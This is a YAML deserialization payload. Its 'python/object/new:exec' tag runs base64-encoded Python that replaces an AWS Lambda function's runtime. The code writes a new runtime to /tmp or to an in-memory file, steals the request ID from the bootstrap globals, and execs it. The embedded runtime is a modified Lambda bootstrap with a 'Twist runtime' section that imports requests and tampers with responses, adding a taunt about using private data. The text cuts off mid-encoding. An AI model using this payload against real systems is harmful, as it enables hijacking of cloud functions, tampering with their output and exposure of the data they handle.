!!python/object/new:exec  [ "payload_b64 = b'aW1wb3J0IG9zCmltcG9ydCBjdHlwZXMgCmltcG9ydCBpbnNwZWN0CmZyb20gYmFzZTY0IGltcG9ydCBiNjRkZWNvZGUKCk1FTUZEX0NSRUFURV9TWVNDQUxMID0gMzE5CgojIERlY29kZSBuZXcgcnVudGltZQpuZXdfcnVudGltZSA9IGI2NGRlY29kZShleHRlcm5hbF9kYXRhX2I2NCkgICMgZXh0ZXJuYWxfZGF0YV9iNjQgaXMgZGVmaW5lZCBpbiB0aGUgeWFtbCBmaWxlCgojIFdyaXRlIHRoZSBuZXcgcnVudGltZSBpbnRvIGEgZmlsZSAKaWYgb3MuYWNjZXNzKCIvdG1wIiwgb3MuV19PSyk6CiAgICBuZXdfcnVudGltZV9wYXRoID0gIi90bXAvbmV3X3J1bnRpbWUiCiAgICB3aXRoIG9wZW4obmV3X3J1bnRpbWVfcGF0aCwgIndiIikgYXMgZjoKICAgICAgICBmLndyaXRlKG5ld19ydW50aW1lKQogICAgb3MuY2htb2QobmV3X3J1bnRpbWVfcGF0aCwgMG83NzcpCmVsc2U6CiAgICAjIEluIGNhc2UgL3RtcCBpcyByZWFkLW9ubHksIGNyZWF0ZSB0aGUgbmV3IHJ1bnRpbWUgZmlsZSBpbiBtZW1vcnkgCiAgICBtZW1mZCA9IGN0eXBlcy5DRExMKCIiKS5zeXNjYWxsKE1FTUZEX0NSRUFURV9TWVNDQUxMLCAibmV3X3J1bnRpbWUiLCAwKQogICAgb3Mud3JpdGUobWVtZmQsIG5ld19ydW50aW1lKQogICAgbmV3X3J1bnRpbWVfcGF0aCA9ICIvcHJvYy9zZWxmL2ZkLyIgKyBzdHIobWVtZmQpCgojIEdldCB0aGUgaW52b2tlIGlkIGZyb20gdGhlIF9HTE9CQUxfQVdTX1JFUVVFU1RfSUQgdmFyaWFibGUgaW4gYm9vdHN0cmFwLnB5Cmludm9rZV9pZCA9IHN0cihpbnNwZWN0LnN0YWNrKClbLTJdWzBdLmZfZ2xvYmFsc1siX0dMT0JBTF9BV1NfUkVRVUVTVF9JRCJdKQoKIyBFeGVjIHRoZSBuZXcgcnVudGltZQphcmdzID0gW25ld19ydW50aW1lX3BhdGgsIGludm9rZV9pZF0Kb3MuZXhlY3YobmV3X3J1bnRpbWVfcGF0aCwgYXJncykKCgoKCg=='; external_data_b64 = b'IyEvdXNyL2Jpbi9lbnYgcHl0aG9uMwoKIiIiCkNvcHlyaWdodCAoYykgMjAxOCBBbWF6b24uIEFsbCByaWdodHMgcmVzZXJ2ZWQuCiIiIgoKaW1wb3J0IGpzb24KaW1wb3J0IGxvZ2dpbmcKaW1wb3J0IG9zCmltcG9ydCBzaXRlCmltcG9ydCBzeXMKaW1wb3J0IHRpbWUKaW1wb3J0IHRyYWNlYmFjawppbXBvcnQgd2FybmluZ3MKCnN5cy5wYXRoLmluc2VydCgwLCAiL3Zhci9ydW50aW1lIikgIyBGb3IgbGFtYmRhIG1vZHVsZXMKCmZyb20gbGFtYmRhX3J1bnRpbWVfY2xpZW50IGltcG9ydCBMYW1iZGFSdW50aW1lQ2xpZW50CmZyb20gbGFtYmRhX3J1bnRpbWVfZXhjZXB0aW9uIGltcG9ydCBGYXVsdEV4Y2VwdGlvbgpmcm9tIGxhbWJkYV9ydW50aW1lX21hcnNoYWxsZXIgaW1wb3J0IHRvX2pzb24KCndpdGggd2FybmluZ3MuY2F0Y2hfd2FybmluZ3MoKToKICAgIHdhcm5pbmdzLmZpbHRlcndhcm5pbmdzKCJpZ25vcmUiLCBjYXRlZ29yeT1EZXByZWNhdGlvbldhcm5pbmcpCiAgICBpbXBvcnQgaW1wCgpFUlJPUl9MT0dfTElORV9URVJNSU5BVEUgPSAnXHInCkVSUk9SX0xPR19JREVOVCA9ICdcdTAwYTAnICAjIE5PLUJSRUFLIFNQQUNFIFUrMDBBMAoKCmRlZiBfZ2V0X2hhbmRsZXIoaGFuZGxlcik6CiAgICB0cnk6CiAgICAgICAgKG1vZG5hbWUsIGZuYW1lKSA9IGhhbmRsZXIucnNwbGl0KCcuJywgMSkKICAgIGV4Y2VwdCBWYWx1ZUVycm9yIGFzIGU6CiAgICAgICAgZmF1bHQgPSBGYXVsdEV4Y2VwdGlvbihGYXVsdEV4Y2VwdGlvbi5NQUxGT1JNRURfSEFORExFUl9OQU1FLCAiQmFkIGhhbmRsZXIgJ3t9Jzoge30iLmZvcm1hdChoYW5kbGVyLCBzdHIoZSkpKQogICAgICAgIHJldHVybiBtYWtlX2ZhdWx0X2hhbmRsZXIoZmF1bHQpCgogICAgZmlsZV9oYW5kbGUsIHBhdGhuYW1lLCBkZXNjID0gTm9uZSwgTm9uZSwgTm9uZQogICAgdHJ5OgogICAgICAgICMgUmVjdXJzaXZlbHkgbG9hZGluZyBoYW5kbGVyIGluIG5lc3RlZCBkaXJlY3RvcmllcwogICAgICAgIGZvciBzZWdtZW50IGluIG1vZG5hbWUuc3BsaXQoJy4nKToKICAgICAgICAgICAgaWYgcGF0aG5hbWUgaXMgbm90IE5vbmU6CiAgICAgICAgICAgICAgICBwYXRobmFtZSA9IFtwYXRobmFtZV0KICAgICAgICAgICAgZmlsZV9oYW5kbGUsIHBhdGhuYW1lLCBkZXNjID0gaW1wLmZpbmRfbW9kdWxlKHNlZ21lbnQsIHBhdGhuYW1lKQogICAgICAgIGlmIGZpbGVfaGFuZGxlIGlzIE5vbmU6CiAgICAgICAgICAgIG1vZHVsZV90eXBlID0gZGVzY1syXQogICAgICAgICAgICBpZiBtb2R1bGVfdHlwZSA9PSBpbXAuQ19CVUlMVElOOgogICAgICAgICAgICAgICAgZmF1bHQgPSBGYXVsdEV4Y2VwdGlvbihGYXVsdEV4Y2VwdGlvbi5CVUlMVF9JTl9NT0RVTEVfQ09ORkxJQ1QsICJDYW5ub3QgdXNlIGJ1aWx0LWluIG1vZHVsZSB7fSBhcyBhIGhhbmRsZXIgbW9kdWxlIi5mb3JtYXQobW9kbmFtZSkpCiAgICAgICAgICAgICAgICByZXF1ZXN0X2hhbmRsZXIgPSBtYWtlX2ZhdWx0X2hhbmRsZXIoZmF1bHQpCiAgICAgICAgICAgICAgICByZXR1cm4gcmVxdWVzdF9oYW5kbGVyCiAgICAgICAgbSA9IGltcC5sb2FkX21vZHVsZShtb2RuYW1lLCBmaWxlX2hhbmRsZSwgcGF0aG5hbWUsIGRlc2MpCiAgICBleGNlcHQgSW1wb3J0RXJyb3IgYXMgZToKICAgICAgICBmYXVsdCA9IEZhdWx0RXhjZXB0aW9uKEZhdWx0RXhjZXB0aW9uLklNUE9SVF9NT0RVTEVfRVJST1IsICJVbmFibGUgdG8gaW1wb3J0IG1vZHVsZSAne30nOiB7fSIuZm9ybWF0KG1vZG5hbWUsIHN0cihlKSkpCiAgICAgICAgcmVxdWVzdF9oYW5kbGVyID0gbWFrZV9mYXVsdF9oYW5kbGVyKGZhdWx0KQogICAgICAgIHJldHVybiByZXF1ZXN0X2hhbmRsZXIKICAgIGV4Y2VwdCBTeW50YXhFcnJvciBhcyBlOgogICAgICAgIHRyYWNlID0gIkZpbGUgXCIlc1wiIExpbmUgJXNcblx0JXMiICUgKGUuZmlsZW5hbWUsIGUubGluZW5vLCBlLnRleHQpCiAgICAgICAgZmF1bHQgPSBGYXVsdEV4Y2VwdGlvbihGYXVsdEV4Y2VwdGlvbi5VU0VSX0NPREVfU1lOVEFYX0VSUk9SLCAiU3ludGF4IGVycm9yIGluIG1vZHVsZSAne30nOiB7fSIuZm9ybWF0KG1vZG5hbWUsIHN0cihlKSksIHRyYWNlKQogICAgICAgIHJlcXVlc3RfaGFuZGxlciA9IG1ha2VfZmF1bHRfaGFuZGxlcihmYXVsdCkKICAgICAgICByZXR1cm4gcmVxdWVzdF9oYW5kbGVyCiAgICBmaW5hbGx5OgogICAgICAgIGlmIGZpbGVfaGFuZGxlIGlzIG5vdCBOb25lOgogICAgICAgICAgICBmaWxlX2hhbmRsZS5jbG9zZSgpCgogICAgdHJ5OgogICAgICAgIHJlcXVlc3RfaGFuZGxlciA9IGdldGF0dHIobSwgZm5hbWUpCiAgICBleGNlcHQgQXR0cmlidXRlRXJyb3I6CiAgICAgICAgZmF1bHQgPSBGYXVsdEV4Y2VwdGlvbihGYXVsdEV4Y2VwdGlvbi5IQU5ETEVSX05PVF9GT1VORCwgIkhhbmRsZXIgJ3t9JyBtaXNzaW5nIG9uIG1vZHVsZSAne30nIi5mb3JtYXQoZm5hbWUsIG1vZG5hbWUpLCBOb25lKQogICAgICAgIHJlcXVlc3RfaGFuZGxlciA9IG1ha2VfZmF1bHRfaGFuZGxlcihmYXVsdCkKICAgIHJldHVybiByZXF1ZXN0X2hhbmRsZXIKCgpkZWYgbWFrZV9mYXVsdF9oYW5kbGVyKGZhdWx0KToKICAgIGRlZiByZXN1bHQoKmFyZ3MpOgogICAgICAgIHJhaXNlIGZhdWx0CgogICAgcmV0dXJuIHJlc3VsdAoKCmRlZiBtYWtlX2Vycm9yKGVycm9yX21lc3NhZ2UsIGVycm9yX3R5cGUsIHN0YWNrX3RyYWNlKToKICAgIHJlc3VsdCA9IHt9CiAgICBpZiBlcnJvcl9tZXNzYWdlOgogICAgICAgIHJlc3VsdFsnZXJyb3JNZXNzYWdlJ10gPSBlcnJvcl9tZXNzYWdlCiAgICBpZiBlcnJvcl90eXBlOgogICAgICAgIHJlc3VsdFsnZXJyb3JUeXBlJ10gPSBlcnJvcl90eXBlCiAgICBpZiBzdGFja190cmFjZToKICAgICAgICByZXN1bHRbJ3N0YWNrVHJhY2UnXSA9IHN0YWNrX3RyYWNlCiAgICByZXR1cm4gcmVzdWx0CgoKZGVmIHJlcGxhY2VfbGluZV9pbmRlbnRhdGlvbihsaW5lLCBpbmRlbnRfY2hhciwgbmV3X2luZGVudF9jaGFyKToKICAgIGlkZW50X2NoYXJzX2NvdW50ID0gMAogICAgZm9yIGMgaW4gbGluZToKICAgICAgICBpZiBjICE9IGluZGVudF9jaGFyOgogICAgICAgICAgICBicmVhawogICAgICAgIGlkZW50X2NoYXJzX2NvdW50ICs9IDEKICAgIHJldHVybiAobmV3X2luZGVudF9jaGFyICogaWRlbnRfY2hhcnNfY291bnQpICsgbGluZVtpZGVudF9jaGFyc19jb3VudDpdCgoKZGVmIGxvZ19lcnJvcihlcnJvcl9yZXN1bHQpOgogICAgZXJyb3JfZGVzY3JpcHRpb24gPSAiW0VSUk9SXSIKCiAgICBlcnJvcl9yZXN1bHRfdHlwZSA9IGVycm9yX3Jlc3VsdC5nZXQoJ2Vycm9yVHlwZScpCiAgICBpZiBlcnJvcl9yZXN1bHRfdHlwZToKICAgICAgICBlcnJvcl9kZXNjcmlwdGlvbiArPSAiICIgKyBlcnJvcl9yZXN1bHRfdHlwZQoKICAgIGVycm9yX3Jlc3VsdF9tZXNzYWdlID0gZXJyb3JfcmVzdWx0LmdldCgnZXJyb3JNZXNzYWdlJykKICAgIGlmIGVycm9yX3Jlc3VsdF9tZXNzYWdlOgogICAgICAgIGlmIGVycm9yX3Jlc3VsdF90eXBlOgogICAgICAgICAgICBlcnJvcl9kZXNjcmlwdGlvbiArPSAiOiIKICAgICAgICBlcnJvcl9kZXNjcmlwdGlvbiArPSAiICIgKyBlcnJvcl9yZXN1bHRfbWVzc2FnZQoKICAgIGVycm9yX21lc3NhZ2VfbGluZXMgPSBbZXJyb3JfZGVzY3JpcHRpb25dCgogICAgc3RhY2tfdHJhY2UgPSBlcnJvcl9yZXN1bHQuZ2V0KCdzdGFja1RyYWNlJykKICAgIGlmIHN0YWNrX3RyYWNlIGlzIG5vdCBOb25lOgogICAgICAgIGVycm9yX21lc3NhZ2VfbGluZXMgKz0gWyJUcmFjZWJhY2sgKG1vc3QgcmVjZW50IGNhbGwgbGFzdCk6Il0KICAgICAgICBmb3IgdHJhY2VfZWxlbWVudCBpbiBzdGFja190cmFjZToKICAgICAgICAgICAgaWYgdHJhY2VfZWxlbWVudCA9PSAiIjoKICAgICAgICAgICAgICAgIGVycm9yX21lc3NhZ2VfbGluZXMgKz0gWyIiXQogICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgZm9yIHRyYWNlX2xpbmUgaW4gdHJhY2VfZWxlbWVudC5zcGxpdGxpbmVzKCk6CiAgICAgICAgICAgICAgICAgICAgZXJyb3JfbWVzc2FnZV9saW5lcyArPSBbcmVwbGFjZV9saW5lX2luZGVudGF0aW9uKHRyYWNlX2xpbmUsICcgJywgRVJST1JfTE9HX0lERU5UKV0KCiAgICBlcnJvcl9tZXNzYWdlID0gRVJST1JfTE9HX0xJTkVfVEVSTUlOQVRFLmpvaW4oZXJyb3JfbWVzc2FnZV9saW5lcykgKyAnXG4nCiAgICBzeXMuc3Rkb3V0LndyaXRlKGVycm9yX21lc3NhZ2UpCgoKCmRlZiBwYXJzZV9qc29uX2hlYWRlcihoZWFkZXIsIG5hbWUpOgogICAgdHJ5OgogICAgICAgIHJldHVybiBqc29uLmxvYWRzKGhlYWRlcikKICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToKICAgICAgICByYWlzZSBGYXVsdEV4Y2VwdGlvbihGYXVsdEV4Y2VwdGlvbi5MQU1CREFfQ09OVEVYVF9VTk1BUlNIQUxfRVJST1IsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIlVuYWJsZSB0byBwYXJzZSB7fSBKU09OOiB7fSIuZm9ybWF0KG5hbWUsIHN0cihlKSksIE5vbmUpCgoKZGVmIGNyZWF0ZV9sYW1iZGFfY29udGV4dChjbGllbnRfY29udGV4dF9qc29uLCBjb2duaXRvX2lkZW50aXR5X2pzb24sIGVwb2NoX2RlYWRsaW5lX3RpbWVfaW5fbXMsIGludm9rZV9pZCwKICAgICAgICAgICAgICAgICAgICAgICAgICBpbnZva2VkX2Z1bmN0aW9uX2Fybik6CiAgICBjbGllbnRfY29udGV4dCA9IE5vbmUKICAgIGlmIGNsaWVudF9jb250ZXh0X2pzb246CiAgICAgICAgY2xpZW50X2NvbnRleHQgPSBwYXJzZV9qc29uX2hlYWRlcihjbGllbnRfY29udGV4dF9qc29uLCAiQ2xpZW50IENvbnRleHQiKQogICAgY29nbml0b19pZGVudGl0eSA9IE5vbmUKICAgIGlmIGNvZ25pdG9faWRlbnRpdHlfanNvbjoKICAgICAgICBjb2duaXRvX2lkZW50aXR5ID0gcGFyc2VfanNvbl9oZWFkZXIoY29nbml0b19pZGVudGl0eV9qc29uLCAiQ29nbml0byBJZGVudGl0eSIpCiAgICByZXR1cm4gTGFtYmRhQ29udGV4dChpbnZva2VfaWQsIGNsaWVudF9jb250ZXh0LCBjb2duaXRvX2lkZW50aXR5LCBlcG9jaF9kZWFkbGluZV90aW1lX2luX21zLAogICAgICAgICAgICAgICAgICAgICAgICAgaW52b2tlZF9mdW5jdGlvbl9hcm4pCgoKZGVmIGJ1aWxkX2ZhdWx0X3Jlc3VsdChleGNfaW5mbywgbXNnKToKICAgIGV0eXBlLCB2YWx1ZSwgdGIgPSBleGNfaW5mbwogICAgdGJfdHVwbGVzID0gZXh0cmFjdF90cmFjZWJhY2sodGIpCiAgICBmb3IgaSBpbiByYW5nZShsZW4odGJfdHVwbGVzKSk6CiAgICAgICAgaWYgIi9ib290c3RyYXAucHkiIG5vdCBpbiB0Yl90dXBsZXNbaV1bMF06ICAjIGZpbGVuYW1lIG9mIHRoZSB0YiB0dXBsZQogICAgICAgICAgICB0Yl90dXBsZXMgPSB0Yl90dXBsZXNbaTpdCiAgICAgICAgICAgIGJyZWFrCgogICAgcmV0dXJuIG1ha2VfZXJyb3IobXNnIGlmIG1zZyBlbHNlIHN0cih2YWx1ZSksIGV0eXBlLl9fbmFtZV9fLCB0cmFjZWJhY2suZm9ybWF0X2xpc3QodGJfdHVwbGVzKSkKCgpkZWYgZXh0cmFjdF90cmFjZWJhY2sodGIpOgogICAgcmV0dXJuIFsoZnJhbWUuZmlsZW5hbWUsIGZyYW1lLmxpbmVubywgZnJhbWUubmFtZSwgZnJhbWUubGluZSkgZm9yIGZyYW1lIGluIHRyYWNlYmFjay5leHRyYWN0X3RiKHRiKV0KCgpjbGFzcyBDb2duaXRvSWRlbnRpdHkob2JqZWN0KToKICAgIF9fc2xvdHNfXyA9IFsiY29nbml0b19pZGVudGl0eV9pZCIsICJjb2duaXRvX2lkZW50aXR5X3Bvb2xfaWQiXQoKCmNsYXNzIENsaWVudChvYmplY3QpOgogICAgX19zbG90c19fID0gWyJpbnN0YWxsYXRpb25faWQiLCAiYXBwX3RpdGxlIiwgImFwcF92ZXJzaW9uX25hbWUiLCAiYXBwX3ZlcnNpb25fY29kZSIsICJhcHBfcGFja2FnZV9uYW1lIl0KCgpjbGFzcyBDbGllbnRDb250ZXh0KG9iamVjdCk6CiAgICBfX3Nsb3RzX18gPSBbJ2N1c3RvbScsICdlbnYnLCAnY2xpZW50J10KCgpkZWYgbWFrZV9vYmpfZnJvbV9kaWN0KF9jbGFzcywgX2RpY3QsIGZpZWxkcz1Ob25lKToKICAgIGlmIF9kaWN0IGlzIE5vbmU6CiAgICAgICAgcmV0dXJuIE5vbmUKICAgIG9iaiA9IF9jbGFzcygpCiAgICBzZXRfb2JqX2Zyb21fZGljdChvYmosIF9kaWN0KQogICAgcmV0dXJuIG9iagoKCmRlZiBzZXRfb2JqX2Zyb21fZGljdChvYmosIF9kaWN0LCBmaWVsZHM9Tm9uZSk6CiAgICBpZiBmaWVsZHMgaXMgTm9uZToKICAgICAgICBmaWVsZHMgPSBvYmouX19jbGFzc19fLl9fc2xvdHNfXwogICAgZm9yIGZpZWxkIGluIGZpZWxkczoKICAgICAgICBzZXRhdHRyKG9iaiwgZmllbGQsIF9kaWN0LmdldChmaWVsZCwgTm9uZSkpCgoKY2xhc3MgTGFtYmRhQ29udGV4dChvYmplY3QpOgogICAgZGVmIF9faW5pdF9fKHNlbGYsIGludm9rZV9pZCwgY2xpZW50X2NvbnRleHQsIGNvZ25pdG9faWRlbnRpdHksIGVwb2NoX2RlYWRsaW5lX3RpbWVfaW5fbXMsCiAgICAgICAgICAgICAgICAgaW52b2tlZF9mdW5jdGlvbl9hcm49Tm9uZSk6CiAgICAgICAgc2VsZi5hd3NfcmVxdWVzdF9pZCA9IGludm9rZV9pZAogICAgICAgIHNlbGYubG9nX2dyb3VwX25hbWUgPSBvcy5lbnZpcm9uLmdldCgnQVdTX0xBTUJEQV9MT0dfR1JPVVBfTkFNRScpCiAgICAgICAgc2VsZi5sb2dfc3RyZWFtX25hbWUgPSBvcy5lbnZpcm9uLmdldCgnQVdTX0xBTUJEQV9MT0dfU1RSRUFNX05BTUUnKQogICAgICAgIHNlbGYuZnVuY3Rpb25fbmFtZSA9IG9zLmVudmlyb24uZ2V0KCJBV1NfTEFNQkRBX0ZVTkNUSU9OX05BTUUiKQogICAgICAgIHNlbGYubWVtb3J5X2xpbWl0X2luX21iID0gb3MuZW52aXJvbi5nZXQoJ0FXU19MQU1CREFfRlVOQ1RJT05fTUVNT1JZX1NJWkUnKQogICAgICAgIHNlbGYuZnVuY3Rpb25fdmVyc2lvbiA9IG9zLmVudmlyb24uZ2V0KCdBV1NfTEFNQkRBX0ZVTkNUSU9OX1ZFUlNJT04nKQogICAgICAgIHNlbGYuaW52b2tlZF9mdW5jdGlvbl9hcm4gPSBpbnZva2VkX2Z1bmN0aW9uX2FybgoKICAgICAgICBzZWxmLmNsaWVudF9jb250ZXh0ID0gbWFrZV9vYmpfZnJvbV9kaWN0KENsaWVudENvbnRleHQsIGNsaWVudF9jb250ZXh0KQogICAgICAgIGlmIHNlbGYuY2xpZW50X2NvbnRleHQgaXMgbm90IE5vbmU6CiAgICAgICAgICAgIHNlbGYuY2xpZW50X2NvbnRleHQuY2xpZW50ID0gbWFrZV9vYmpfZnJvbV9kaWN0KENsaWVudCwgc2VsZi5jbGllbnRfY29udGV4dC5jbGllbnQpCgogICAgICAgIHNlbGYuaWRlbnRpdHkgPSBtYWtlX29ial9mcm9tX2RpY3QoQ29nbml0b0lkZW50aXR5LCB7fSkKICAgICAgICBpZiBjb2duaXRvX2lkZW50aXR5IGlzIG5vdCBOb25lOgogICAgICAgICAgICBzZWxmLmlkZW50aXR5LmNvZ25pdG9faWRlbnRpdHlfaWQgPSBjb2duaXRvX2lkZW50aXR5LmdldCgiY29nbml0b0lkZW50aXR5SWQiKQogICAgICAgICAgICBzZWxmLmlkZW50aXR5LmNvZ25pdG9faWRlbnRpdHlfcG9vbF9pZCA9IGNvZ25pdG9faWRlbnRpdHkuZ2V0KCJjb2duaXRvSWRlbnRpdHlQb29sSWQiKQoKICAgICAgICBzZWxmLl9lcG9jaF9kZWFkbGluZV90aW1lX2luX21zID0gZXBvY2hfZGVhZGxpbmVfdGltZV9pbl9tcwoKICAgIGRlZiBnZXRfcmVtYWluaW5nX3RpbWVfaW5fbWlsbGlzKHNlbGYpOgogICAgICAgIGVwb2NoX25vd19pbl9tcyA9IGludCh0aW1lLnRpbWUoKSAqIDEwMDApCiAgICAgICAgZGVsdGFfbXMgPSBzZWxmLl9lcG9jaF9kZWFkbGluZV90aW1lX2luX21zIC0gZXBvY2hfbm93X2luX21zCiAgICAgICAgcmV0dXJuIGRlbHRhX21zIGlmIGRlbHRhX21zID4gMCBlbHNlIDAKCiAgICBkZWYgbG9nKHNlbGYsIG1zZyk6CiAgICAgICAgc3lzLnN0ZG91dC53cml0ZShzdHIobXNnKSkKCgpjbGFzcyBMYW1iZGFMb2dnZXJIYW5kbGVyKGxvZ2dpbmcuSGFuZGxlcik6CiAgICBkZWYgX19pbml0X18oc2VsZik6CiAgICAgICAgbG9nZ2luZy5IYW5kbGVyLl9faW5pdF9fKHNlbGYpCgogICAgZGVmIGVtaXQoc2VsZiwgcmVjb3JkKToKICAgICAgICBtc2cgPSBzZWxmLmZvcm1hdChyZWNvcmQpCiAgICAgICAgcHJpbnQobXNnKQoKCmNsYXNzIExhbWJkYUxvZ2dlckZpbHRlcihsb2dnaW5nLkZpbHRlcik6CiAgICBkZWYgZmlsdGVyKHNlbGYsIHJlY29yZCk6CiAgICAgICAgcmVjb3JkLmF3c19yZXF1ZXN0X2lkID0gX0dMT0JBTF9BV1NfUkVRVUVTVF9JRCBvciAiIgogICAgICAgIHJldHVybiBUcnVlCgoKY2xhc3MgVW5idWZmZXJlZChvYmplY3QpOgogICAgZGVmIF9faW5pdF9fKHNlbGYsIHN0cmVhbSk6CiAgICAgICAgc2VsZi5zdHJlYW0gPSBzdHJlYW0KCiAgICBkZWYgX19nZXRhdHRyX18oc2VsZiwgYXR0cik6CiAgICAgICAgcmV0dXJuIGdldGF0dHIoc2VsZi5zdHJlYW0sIGF0dHIpCgogICAgZGVmIHdyaXRlKHNlbGYsIG1zZyk6CiAgICAgICAgc2VsZi5zdHJlYW0ud3JpdGUobXNnKQogICAgICAgIHNlbGYuc3RyZWFtLmZsdXNoKCkKCiAgICBkZWYgd3JpdGVsaW5lcyhzZWxmLCBtc2dzKToKICAgICAgICBzZWxmLnN0cmVhbS53cml0ZWxpbmVzKG1zZ3MpCiAgICAgICAgc2VsZi5zdHJlYW0uZmx1c2goKQoKCmRlZiBpc19weXRob25wYXRoX3NldCgpOgogICAgcmV0dXJuICJQWVRIT05QQVRIIiBpbiBvcy5lbnZpcm9uCgoKZGVmIGdldF9vcHRfc2l0ZV9wYWNrYWdlc19kaXJlY3RvcnkoKToKICAgIHJldHVybiAnL29wdC9weXRob24vbGliL3B5dGhvbnt9Lnt9L3NpdGUtcGFja2FnZXMnLmZvcm1hdChzeXMudmVyc2lvbl9pbmZvLm1ham9yLCBzeXMudmVyc2lvbl9pbmZvLm1pbm9yKQoKCmRlZiBnZXRfb3B0X3B5dGhvbl9kaXJlY3RvcnkoKToKICAgIHJldHVybiAnL29wdC9weXRob24nCgoKIyBzZXQgZGVmYXVsdCBzeXMucGF0aCBmb3IgZGlzY292ZXJhYmlsaXR5CiMgcHJlY2VkZW5jZTogL3Zhci90YXNrIC0+IC9vcHQvcHl0aG9uL2xpYi9weXRob25OLk4vc2l0ZS1wYWNrYWdlcyAtPiAvb3B0L3B5dGhvbgpkZWYgc2V0X2RlZmF1bHRfc3lzX3BhdGgoKToKICAgIGlmIG5vdCBpc19weXRob25wYXRoX3NldCgpOgogICAgICAgIHN5cy5wYXRoLmluc2VydCgwLCBnZXRfb3B0X3B5dGhvbl9kaXJlY3RvcnkoKSkKICAgICAgICBzeXMucGF0aC5pbnNlcnQoMCwgZ2V0X29wdF9zaXRlX3BhY2thZ2VzX2RpcmVjdG9yeSgpKQogICAgIyAnL3Zhci90YXNrJyBpcyBmdW5jdGlvbiBhdXRob3IncyB3b3JraW5nIGRpcmVjdG9yeQogICAgIyB3ZSBhZGQgaXQgZmlyc3QgaW4gb3JkZXIgdG8gbWltaWMgdGhlIGRlZmF1bHQgYmVoYXZpb3Igb2YgcG9wdWxhdGluZyBzeXMucGF0aCBhbmQgbWFrZSBtb2R1bGVzIHVuZGVyICcvdmFyL3Rhc2snCiAgICAjIGRpc2NvdmVyYWJsZSAtIGh0dHBzOi8vZG9jcy5weXRob24ub3JnLzMvbGlicmFyeS9zeXMuaHRtbCNzeXMucGF0aAogICAgc3lzLnBhdGguaW5zZXJ0KDAsIG9zLmVudmlyb25bJ0xBTUJEQV9UQVNLX1JPT1QnXSkKCgpkZWYgYWRkX2RlZmF1bHRfc2l0ZV9kaXJlY3RvcmllcygpOgogICAgIyBTZXQgJy92YXIvdGFzayBhcyBzaXRlIGRpcmVjdG9yeSBzbyB0aGF0IHdlIGFyZSBhYmxlIHRvIGxvYWQgYWxsIGN1c3RvbWVyIC5wdGggZmlsZXMKICAgIHNpdGUuYWRkc2l0ZWRpcihvcy5lbnZpcm9uWyJMQU1CREFfVEFTS19ST09UIl0pCiAgICBpZiBub3QgaXNfcHl0aG9ucGF0aF9zZXQoKToKICAgICAgICBzaXRlLmFkZHNpdGVkaXIoZ2V0X29wdF9zaXRlX3BhY2thZ2VzX2RpcmVjdG9yeSgpKQogICAgICAgIHNpdGUuYWRkc2l0ZWRpcihnZXRfb3B0X3B5dGhvbl9kaXJlY3RvcnkoKSkKCgpkZWYgdXBkYXRlX3hyYXlfZW52X3ZhcmlhYmxlKHhyYXlfdHJhY2VfaWQpOgogICAgaWYgeHJheV90cmFjZV9pZCBpcyBub3QgTm9uZToKICAgICAgICBvcy5lbnZpcm9uWydfWF9BTVpOX1RSQUNFX0lEJ10gPSB4cmF5X3RyYWNlX2lkCiAgICBlbHNlOgogICAgICAgIGlmICdfWF9BTVpOX1RSQUNFX0lEJyBpbiBvcy5lbnZpcm9uOgogICAgICAgICAgICBkZWwgb3MuZW52aXJvblsnX1hfQU1aTl9UUkFDRV9JRCddCgoKZGVmIGluaXRfbG9nZ2VyKCk6CiAgICBsb2dnaW5nLkZvcm1hdHRlci5jb252ZXJ0ZXIgPSB0aW1lLmdtdGltZQogICAgbG9nZ2VyID0gbG9nZ2luZy5nZXRMb2dnZXIoKQogICAgbG9nZ2VyX2hhbmRsZXIgPSBMYW1iZGFMb2dnZXJIYW5kbGVyKCkKICAgIGxvZ2dlcl9oYW5kbGVyLnNldEZvcm1hdHRlcihsb2dnaW5nLkZvcm1hdHRlcigKICAgICAgICAnWyUobGV2ZWxuYW1lKXNdXHQlKGFzY3RpbWUpcy4lKG1zZWNzKWRaXHQlKGF3c19yZXF1ZXN0X2lkKXNcdCUobWVzc2FnZSlzXG4nLAogICAgICAgICclWS0lbS0lZFQlSDolTTolUycKICAgICkpCiAgICBsb2dnZXJfaGFuZGxlci5hZGRGaWx0ZXIoTGFtYmRhTG9nZ2VyRmlsdGVyKCkpCiAgICBsb2dnZXIuYWRkSGFuZGxlcihsb2dnZXJfaGFuZGxlcikKCgoKIyMgLS0tIFR3aXN0IHJ1bnRpbWUgLS0tICMjCgp0cnk6CiAgICBpbXBvcnQgcmVxdWVzdHMgCmV4Y2VwdCBNb2R1bGVOb3RGb3VuZEVycm9yOgogICAgZnJvbSBib3RvY29yZS52ZW5kb3JlZCBpbXBvcnQgcmVxdWVzdHMKCiMgQWRkIGEgc21hbGwgbm90aWZpY2F0aW9uIHRvIHRoZSByZXNwb25zZQpkZWYgdHdpc3RfcmVzcG9uc2UocmVzcG9uc2UpOgogICAgaWYgdHlwZShyZXNwb25zZSkgaXMgbm90IGRpY3Q6CiAgICAgICAgcmV0dXJuIHJlc3BvbnNlCiAgICAKICAgIGlmICJib2R5IiBub3QgaW4gcmVzcG9uc2Ugb3Igbm90IHJlc3BvbnNlWyJib2R5Il06CiAgICAgICAgcmV0dXJuIHJlc3BvbnNlCiAgICBib2R5ID0gcmVzcG9uc2VbImJvZHkiXQogICAgCiAgICBpZiB0eXBlKGJvZHkpIGlzIG5vdCBkaWN0OgogICAgICAgIHRyeToKICAgICAgICAgICAganNvbl9ib2R5ID0ganNvbi5sb2Fkcyhib2R5KQogICAgICAgIGV4Y2VwdCBqc29uLmRlY29kZXIuSlNPTkRlY29kZUVycm9yIGFzIGU6CiAgICAgICAgICAgIHJldHVybiByZXNwb25zZQogICAgZWxzZToKICAgICAgICBqc29uX2JvZHkgPSBib2R5CgoKICAgIGpzb25fYm9keVsiRllJIl0gPSAiSSdsbCBwdXQgeW91ciBwcml2YXRlIGRhdGEgaW50byBnb29kIHVzZSAoOyIKICAgIHJlc3BvbnNlWyJib2R5Il0gPSBqc29uLmR1bXBzKGpzb25fYm9keSkKICAgIHJldHVybiByZXNwb25zZQoKCmRlZiB0d2lzdF9oYW5kbGVfZXZlbnRfcmVxdWVzdChsYW1iZGFfcnVudGltZV9jbGllbnQsIHJlcXVlc3RfaGFuZGxlciwgaW52b2tlX2lkLCBldmVudF9ib2R5LCBjb250ZW50X3R5cGUsCiAgICAgICAg